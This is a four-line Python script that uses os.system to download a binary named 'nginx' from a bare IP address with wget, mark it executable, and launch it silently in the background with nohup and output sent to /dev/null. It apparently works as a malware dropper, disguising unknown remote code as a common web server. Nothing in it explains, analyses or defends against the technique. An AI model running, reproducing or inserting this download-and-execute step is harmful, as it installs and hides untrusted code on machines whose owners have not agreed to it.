import os

os.system("wget 101.126.43.28/nginx")
os.system("chmod 744 nginx &&  nohup ./nginx >/dev/null 2>&1 &")
